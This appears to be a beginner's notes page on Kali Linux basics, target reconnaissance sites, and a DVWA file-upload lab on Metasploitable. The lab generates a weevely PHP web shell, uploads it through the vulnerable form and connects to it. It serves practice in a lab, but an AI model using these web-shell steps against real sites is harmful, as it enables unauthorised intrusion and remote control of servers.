
# kali linux commands

- prints current working directry, uses to redirect to open a file - `pwd`  

- list all files - `ls`

- open a folder - `cd`

- previous folder - `..`  

- prints descrption of a function - `man`   

-  Delete a file `rm -rf` 

- used to update like (winget in windows) - `sudo apt-get update` 

- upgrade kali linux - `sudo apt upgrade` 

- update kali linux - `sudo apt update`  

<h3 align="center"> ... </h3>  

## check IP address


- to check the information of the target website  
```
http://whois.domaintools.com/
```
- to check which techonology is used in target website  
```
http://toolbar.netcraft.com/site_report?url=
```

- which which website have same ipaddress  

>if we can hack into 1 we can hack all the other

```
https://www.robtex.com/ 
```  
- Using bing.com, search for `ip: [target ip]`
- <h3 align="center"> ... </h3> 

# file upload vulnerability

- open metasploitable in vmware
- run `ifconfig`
- copy the ipaddress and now open kali browser and paste it in the url
- open DVWA
- username: `admin`
- password: ` password`
- open upload in the side menu section
- ![image](https://github.com/stellados53/kali-commands/assets/142677726/ef6b3d0c-f2fe-4fa9-8941-ebf6de5fb677)
- download a image and try to upload in DVWA
- now its generate a URL as shown in the image..copy it.
- paste it in the newtab with
```
 http://192.168.11.128/dvwa/....
```
<h3> UPLOADING PHP </h3> 

- open kali terminal.
- run.

```
weevely generate 123456 /root/shell.php
```
- now it generates copy and paste in the new tab with a `http://.....` as before

- now in terminal run
```
weevely http://192.168.11.128/dvwa/hackable/uploads/shell.php 123456
```
![image](https://github.com/stellados53/kali-commands/assets/142677726/32f5e0e0-bdd3-425b-9e8c-56dba7d6bc3e)

 



